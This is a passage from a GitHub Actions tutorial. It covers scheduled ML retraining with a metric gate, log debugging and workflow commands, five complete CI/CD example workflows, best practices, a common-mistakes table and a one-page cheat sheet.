      - name: Enforce the metric gate
        run: python -m src.evaluate --min-f1 0.55 --report metrics.json
      - uses: actions/upload-artifact@v4
        if: always()
        with:
          name: smoke-metrics
          path: metrics.json
          retention-days: 14
```

### Scheduled retraining on a GPU runner

```yaml .github/workflows/retrain.yml — nightly training with a promotion gate
name: Retrain

on:
  schedule:
    - cron: '0 2 * * *'        # 02:00 UTC nightly
  workflow_dispatch:
    inputs:
      dataset-version:
        description: 'Dataset tag to train on'
        type: string
        default: latest

permissions:
  contents: read
  id-token: write              # OIDC for the object store, no static keys

jobs:
  train:
    runs-on: [self-hosted, linux, gpu]
    timeout-minutes: 600
    outputs:
      f1: ${{ steps.eval.outputs.f1 }}
    steps:
      - uses: actions/checkout@v4

      - name: Pull the dataset
        run: dvc pull --run-cache
        env:
          DATASET_VERSION: ${{ inputs.dataset-version || 'latest' }}

      - name: Train
        run: python -m src.train --config configs/full.yaml

      - id: eval
        name: Evaluate and expose the metric
        run: |
          f1=$(python -m src.evaluate --report metrics.json --print f1)
          echo "f1=$f1" >> "$GITHUB_OUTPUT"
          echo "### Nightly run: F1 = $f1" >> "$GITHUB_STEP_SUMMARY"

      - uses: actions/upload-artifact@v4
        with:
          name: model-${{ github.run_id }}
          path: |
            artifacts/model/
            metrics.json

  promote:
    needs: train
    if: needs.train.outputs.f1 >= '0.82'
    runs-on: ubuntu-latest
    environment: model-registry        # required reviewer before promotion
    steps:
      - uses: actions/download-artifact@v4
        with:
          name: model-${{ github.run_id }}
      - run: python -m src.registry.promote --stage production
```

<div class="callout warn">
  <span class="ct">Never commit datasets or checkpoints</span>
  Git is not built for hundred-megabyte binaries, and a repository that carries them is slow to clone on every single runner. Keep data and weights in object storage referenced by DVC, Git LFS, or a registry, and let the workflow fetch exactly the version it needs. Cache the download directory keyed on the dataset version so repeat runs are fast.
</div>

<div class="callout tip">
  <span class="ct">Make the metric the check</span>
  A training job that always exits zero is not a test. Have the evaluation step compare against a committed baseline and exit non-zero when the model regresses, then write the comparison to <code>$GITHUB_STEP_SUMMARY</code> so reviewers see the numbers in the pull request without opening logs.
</div>

### Expected result or use case

Pull requests get a green or red answer within ten minutes on code, data, and a smoke train. Full training runs nightly on a GPU runner, and a model only reaches the registry after both the metric gate and a human reviewer approve it.

## 24 Debugging and Observability

Most CI frustration comes from working blind. Actions has a small set of tools that turn "it fails on GitHub" into a specific, readable answer.

### Read the log correctly

<ol class="guide-steps">
  <li><b>Open the failing step, not the job</b>The Actions tab shows a red cross on exactly one step. Expand only that one.</li>
  <li><b>Read upwards from the first error</b>The last lines are usually a generic "process exited with code 1". The real cause is the first error message above it.</li>
  <li><b>Compare the environment</b>Check the tool versions the log prints against your local ones. Different Python or Node minor versions explain a surprising share of failures.</li>
  <li><b>Re-run with debug logging</b>Use the <strong>Re-run jobs</strong> dropdown and tick "Enable debug logging", or set the repository secret <code>ACTIONS_STEP_DEBUG</code> to <code>true</code> for every run.</li>
  <li><b>Reproduce locally</b>Run the exact commands in a matching container, for example <code>docker run --rm -it -v "$PWD:/w" -w /w node:20 bash</code>, before changing the workflow again.</li>
</ol>

### Workflow commands worth knowing

```bash annotations, grouping, and summaries
# annotations appear inline on the pull request diff
echo "::error file=src/app.ts,line=42::Null check missing"
echo "::warning file=README.md::Docs are out of date"
echo "::notice::Deployed to staging"

# collapse noisy output into an expandable group
echo "::group::Installing dependencies"
npm ci
echo "::endgroup::"

# hide an accidental value from the log
echo "::add-mask::$SOME_TOKEN"

# a rich markdown report on the run summary page
{
  echo "## Test results"
  echo ""
  echo "| Suite | Passed | Failed |"
  echo "|---|---|---|"
  echo "| unit | 214 | 0 |"
  echo "| integration | 37 | 1 |"
} >> "$GITHUB_STEP_SUMMARY"
```

### Local and interactive debugging

| Tool | Use it for |
|---|---|
| `act` | Running a workflow locally in Docker. Good for YAML and logic, imperfect for services and caching |
| `actionlint` | Static analysis of workflow files, catches typos and bad expressions before you push |
| `mxschmitt/action-tmate` | An interactive SSH session into a live runner. Add it temporarily, never on a public repository |
| `gh run watch` / `gh run view --log-failed` | Following and reading runs from your terminal |
| Job summaries | Turning a failure into a readable report instead of a log hunt |

```bash pre-flight checks before you push
# validate every workflow file
actionlint

# dry-run the push event locally
act push --container-architecture linux/amd64

# watch the run you just triggered, then read only the failing log
gh run watch
gh run view --log-failed
```

<div class="callout tip">
  <span class="ct">Measure before optimising</span>
  The run summary lists per-job duration, and the repository's Insights → Actions page shows total minutes per workflow. Optimise the slowest job, not the one you happen to be reading. Nine times out of ten the answer is a cache key or a matrix that is larger than it needs to be on pull requests.
</div>

### Expected result or use case

`actionlint` in a pre-commit hook plus one job summary per pipeline removes most of the edit-commit-wait loop that makes CI feel slow to work on.

## 25 Complete CI/CD Examples

Five complete, copy-paste-ready recipes for common setups. Pick the one closest to your stack, commit it to `.github/workflows/`, watch it run, then adapt versions, paths, and commands.

### Example 1 — Node.js CI with pull request checks

```yaml .github/workflows/node-ci.yml
name: Node CI

on:
  pull_request:
  push:
    branches: [main]

concurrency:
  group: ci-${{ github.ref }}
  cancel-in-progress: true

permissions:
  contents: read

jobs:
  ci:
    runs-on: ubuntu-latest
    timeout-minutes: 20
    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-node@v4
        with:
          node-version: 20
          cache: npm

      - name: Install
        run: npm ci

      - name: Lint
        run: npm run lint

      - name: Type check
        run: npm run typecheck

      - name: Test with coverage
        run: npm test -- --coverage

      - name: Build
        run: npm run build

      - uses: actions/upload-artifact@v4
        if: always()
        with:
          name: coverage-report
          path: coverage/
          retention-days: 7
```

### Example 2 — Python package: test matrix, then publish to PyPI

```yaml .github/workflows/python-publish.yml
name: Python CI/CD

on:
  push:
    branches: [main]
    tags: ['v*']

permissions:
  contents: read

jobs:
  test:
    runs-on: ubuntu-latest
    timeout-minutes: 20
    strategy:
      fail-fast: false
      matrix:
        python: ['3.10', '3.11', '3.12']
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: ${{ matrix.python }}
          cache: pip
      - run: pip install -e ".[dev]"
      - run: pytest --cov=./ --cov-report=xml
      - uses: codecov/codecov-action@v4
        with:
          files: coverage.xml

  publish:
    if: startsWith(github.ref, 'refs/tags/v')
    needs: test
    runs-on: ubuntu-latest
    environment: pypi                # required reviewer before a release
    permissions:
      id-token: write                # OIDC trusted publishing, no API token
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: '3.12'
      - run: pip install build && python -m build
      - uses: pypa/gh-action-pypi-publish@release/v1
```

### Example 3 — Deploy a static site to GitHub Pages

```yaml .github/workflows/pages.yml
name: Deploy to Pages

on:
  push:
    branches: [main]
  workflow_dispatch:

permissions:
  contents: read
  pages: write
  id-token: write

concurrency:
  group: pages
  cancel-in-progress: true

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: 20
          cache: npm
      - run: npm ci
      - run: npm run build
      - uses: actions/upload-pages-artifact@v3
        with:
          path: out

  deploy:
    needs: build
    runs-on: ubuntu-latest
    environment:
      name: github-pages
      url: ${{ steps.deployment.outputs.page_url }}
    steps:
      - id: deployment
        uses: actions/deploy-pages@v4
```

### Example 4 — Release pipeline: tag, build binaries, publish a release

```yaml .github/workflows/release.yml
name: Release

on:
  push:
    tags: ['v*.*.*']

permissions:
  contents: write

jobs:
  build:
    runs-on: ${{ matrix.os }}
    strategy:
      fail-fast: false
      matrix:
        include:
          - os: ubuntu-latest
            artifact: myapp-linux
          - os: windows-latest
            artifact: myapp-windows.exe
          - os: macos-latest
            artifact: myapp-macos
    steps:
      - uses: actions/checkout@v4
      - run: make build RELEASE=${{ github.ref_name }}
      - uses: actions/upload-artifact@v4
        with:
          name: ${{ matrix.artifact }}
          path: bin/release/*

  publish:
    needs: build
    runs-on: ubuntu-latest
    steps:
      - uses: actions/download-artifact@v4
        with:
          path: bin/
          merge-multiple: true
      - name: Create the GitHub Release
        uses: softprops/action-gh-release@v2
        with:
          generate_release_notes: true   # changelog from merged pull requests
          files: bin/*
```

### Example 5 — Scheduled dependency updates

```yaml .github/workflows/deps.yml
name: Update Dependencies

on:
  schedule:
    - cron: '0 6 * * 1'        # every Monday at 06:00 UTC
  workflow_dispatch:

permissions:
  contents: write
  pull-requests: write

jobs:
  update:
    runs-on: ubuntu-latest
    timeout-minutes: 20
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: 20
          cache: npm

      - run: npm outdated || true
      - run: npm update
      - run: npm ci && npm test

      - name: Open a pull request when something changed
        run: |
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          gh auth setup-git
          branch="deps/update-${GITHUB_RUN_ID}"
          git checkout -b "$branch"
          git add package.json package-lock.json
          if git diff --cached --quiet; then
            echo "Nothing to update"
          else
            git commit -m "chore: weekly dependency update"
            git push origin "$branch"
            gh pr create --title "chore: weekly dependency update" \
                         --body "Automated weekly update" --base main
          fi
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
```

### Expected result or use case

Together these five files cover test-on-PR, publish-on-tag, deploy-on-merge, cross-platform release, and scheduled maintenance, which is the complete lifecycle of most projects.

## 26 Best Practices

<div class="cards">
  <div class="card"><div class="icon">🔒</div><h4>Pin actions by SHA</h4><p>Tags can be moved by a maintainer, commit SHAs cannot. Keep the version in a trailing comment and let Dependabot bump it.</p></div>
  <div class="card"><div class="icon">🕶️</div><h4>Least-privilege tokens</h4><p>Start from <code>permissions: {}</code> and grant the narrowest scope each job actually needs.</p></div>
  <div class="card"><div class="icon">⏱️</div><h4>Always set timeouts</h4><p><code>timeout-minutes</code> on every job. The default is six hours, which is long enough to waste an entire quota.</p></div>
  <div class="card"><div class="icon">🔁</div><h4>Use concurrency groups</h4><p>Key on <code>github.ref</code> with <code>cancel-in-progress: true</code> for CI, and <code>false</code> for deploys.</p></div>
  <div class="card"><div class="icon">🏃</div><h4>Parallelise, then gate</h4><p>Run lint, test, and build as independent jobs, then <code>needs:</code> them into a single deploy stage.</p></div>
  <div class="card"><div class="icon">📦</div><h4>Cache everything expensive</h4><p>Package managers, toolchains, and Docker layers via <code>cache-from/to: type=gha</code>.</p></div>
  <div class="card"><div class="icon">🧼</div><h4>Quote env, never expressions</h4><p>Pass untrusted event data through <code>env:</code> and read <code>"$VAR"</code> in the shell.</p></div>
  <div class="card"><div class="icon">♻️</div><h4>Reuse instead of copying</h4><p>Composite actions and reusable workflows keep many repositories in sync from one place.</p></div>
  <div class="card"><div class="icon">🚦</div><h4>Gate production</h4><p>Environments with required reviewers and a deployment-branch allow-list.</p></div>
  <div class="card"><div class="icon">📌</div><h4>Pin runner versions</h4><p>Use <code>ubuntu-24.04</code> rather than <code>ubuntu-latest</code> where reproducibility matters more than freshness.</p></div>
  <div class="card"><div class="icon">📝</div><h4>Write job summaries</h4><p><code>$GITHUB_STEP_SUMMARY</code> turns a log hunt into a table a reviewer can read in five seconds.</p></div>
  <div class="card"><div class="icon">🧪</div><h4>Keep pull request CI under ten minutes</h4><p>Move slow suites to a nightly schedule. Feedback nobody waits for is feedback nobody reads.</p></div>
</div>

### Expected result or use case

A pipeline that follows these twelve rules is fast on pull requests, cheap on minutes, auditable on deploys, and hard to compromise through a dependency.

## 27 Common Mistakes and Fixes

Every Actions user hits these. Recognising them early turns hours of confusion into minutes.

| # | Symptom | Why it happens | Fix |
|---|---|---|---|
| 1 | YAML syntax error such as "mapping values are not allowed here" | Tabs instead of spaces, or misaligned indentation | Two spaces per level, never Tab. Run `actionlint` before pushing |
| 2 | The workflow never runs at all | The file is not in `.github/workflows/`, has the wrong extension, or the `on:` trigger does not match | Check the exact path and extension, test with `on: push`, and look at the Actions tab |
| 3 | Python `3.10` silently becomes `3.1` | Unquoted YAML numbers are parsed as floats and lose the trailing zero | Quote versions: `python-version: '3.10'` |
| 4 | The second job cannot find files the first job built | Each job runs on a separate fresh VM with its own filesystem | Upload an artifact in job one, download it in job two (section 14) |
| 5 | `npm: command not found` or the wrong tool version | Setup actions apply per job, and preinstalled versions differ from yours | Add the `setup-*` action in every job that needs it, right after checkout |
| 6 | A secret prints as `***` and looks broken | Masking is by design | Nothing to fix. Verify existence by length: `if [ -z "$KEY" ]; then echo missing; fi` |
| 7 | `403 Resource not accessible by integration` | The automatic token is intentionally limited | Declare `permissions:` with the scope you need (section 20) |
| 8 | A scheduled workflow fires late or stops firing | Cron is UTC, busy hours add delays, and schedules pause after sixty days of inactivity | Convert to UTC, do not rely on exact timing, add `workflow_dispatch` as a backup |
| 9 | Green locally, red on GitHub | Different OS, tool versions, missing environment, or case-sensitive paths | Read the failing step from the first error upwards, then reproduce in a matching container |
| 10 | The workflow "changed behaviour by itself" | `@v4`, `ubuntu-latest`, and base images all move | Pin actions by SHA and runners by version |
| 11 | The cache never hits | Exact key match required, and caches are branch-scoped | Use `hashFiles(...)` plus `restore-keys:` fallbacks (section 13) |
| 12 | Everything runs on every push, wasting minutes | No path filters and no concurrency grouping | Add `paths-ignore:` for docs and a concurrency group with `cancel-in-progress: true` |
| 13 | Only one `push:` filter applies | A duplicated YAML key silently keeps the last block | Put `branches`, `tags`, and `paths` inside a single `push:` entry |
| 14 | `if:` never matches | Comparing a boolean to a string, or wrapping the whole condition in `${{ }}` unnecessarily | Compare types carefully: `inputs.dry_run == true`, not `== 'true'` |
| 15 | A matrix job cannot upload artifacts | Every entry tried to upload under the same artifact name | Include a matrix value in the name, then merge with `pattern:` on download |
| 16 | A step's `$GITHUB_ENV` value is empty in the same step | `$GITHUB_ENV` only applies to **later** steps | Use a normal shell variable within the step, or split into two steps |

<div class="callout tip">
  <span class="ct">Debugging toolbox</span>
  Re-run a failed run with <strong>Enable debug logging</strong>, or set the repository secret <code>ACTIONS_STEP_DEBUG</code> to <code>true</code>. While developing, print state generously with <code>env | sort</code>, <code>ls -la</code>, and <code>cat</code> of any generated config. For stubborn cases, add a tmate step temporarily to get an interactive shell on the runner.
</div>

### Expected result or use case

Most red runs fall into one of these sixteen patterns, so the first move on a failure should be pattern-matching against this table rather than rewriting the workflow.

## 28 Cheat Sheet

```yaml one-page reference
# ── MINIMAL WORKFLOW ─────────────────────────────────────
name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: echo hello

# ── TRIGGERS ────────────────────────────────────────────
on: [push, pull_request]                    # list
on: {push: {branches: [main]}}              # filtered
on: {schedule: [{cron: '0 3 * * *'}]}       # cron (UTC)
on: workflow_dispatch                       # manual button
on: workflow_call                           # reusable

# ── SAFETY RAILS FOR EVERY WORKFLOW ─────────────────────
permissions: {}
concurrency: {group: 'ci-${{ github.ref }}', cancel-in-progress: true}
# and timeout-minutes on every job

# ── KEY EXPRESSIONS ─────────────────────────────────────
${{ github.sha }}            commit SHA
${{ github.ref }}            refs/heads/main
${{ github.ref_name }}       main
${{ github.event_name }}     push
${{ github.actor }}          who triggered the run
${{ github.repository }}     owner/repo
${{ github.run_id }}         unique run identifier
${{ github.event.* }}        webhook payload
${{ secrets.X }}             encrypted value
${{ vars.X }}                configuration value
${{ env.X }}                 env-var value
${{ matrix.X }}              matrix value
${{ steps.id.outputs.x }}    step output
${{ needs.job.outputs.x }}   job output
${{ needs.job.result }}      success / failure / cancelled / skipped
${{ inputs.x }}              dispatch or call input
${{ runner.os }}             Linux / Windows / macOS
${{ job.status }}            success / failure / cancelled

# ── STEP OUTPUT PATTERN ─────────────────────────────────
- id: s
  run: echo "key=value" >> "$GITHUB_OUTPUT"
# read it: ${{ steps.s.outputs.key }}

# ── MULTI-LINE OUTPUT ───────────────────────────────────
- id: m
  run: |
    {
      echo "text<<EOF"
      echo "line 1"
      echo "line 2"
      echo "EOF"
    } >> "$GITHUB_OUTPUT"

# ── THE FOUR SPECIAL FILES ──────────────────────────────
$GITHUB_OUTPUT        step outputs
$GITHUB_ENV           env vars for later steps
$GITHUB_PATH          PATH additions for later steps
$GITHUB_STEP_SUMMARY  markdown on the run summary page

# ── DEFAULT SHELL VARS ──────────────────────────────────
$GITHUB_WORKSPACE   $GITHUB_SHA      $GITHUB_REF
$GITHUB_REPOSITORY  $GITHUB_TOKEN    $RUNNER_OS
$GITHUB_EVENT_NAME  $GITHUB_JOB      $GITHUB_RUN_ID

# ── WORKFLOW COMMANDS ───────────────────────────────────
echo "::error file=a.ts,line=9::message"
echo "::warning::message"
echo "::notice::message"
echo "::group::title" … echo "::endgroup::"
echo "::add-mask::$VALUE"

# ── COMMON COMBOS ───────────────────────────────────────
# checkout + language + cache, in three steps:
- uses: actions/checkout@v4
- uses: actions/setup-node@v4
  with: {node-version: 20, cache: npm}
- run: npm ci && npm test

# conditional environment via short-circuit:
environment: ${{ github.ref == 'refs/heads/main' && 'production' || 'staging' }}

# debug logging when desperate:
#   Re-run jobs → Enable debug logging
#   or set the secret ACTIONS_STEP_DEBUG = true
```

### Practical workflow

```bash the local loop that keeps CI green
actionlint                       # validate workflow syntax and expressions
act push -j ci                   # dry-run a single job in Docker
git commit -am "ci: add cache"   # commit the change
gh run watch                     # follow the real run from the terminal
gh run view --log-failed         # read only what broke
```

### Expected result or use case

This page plus the Actions tab is usually enough to write a correct workflow from memory. Come back to the numbered sections when you need the reasoning behind a keyword rather than its syntax.
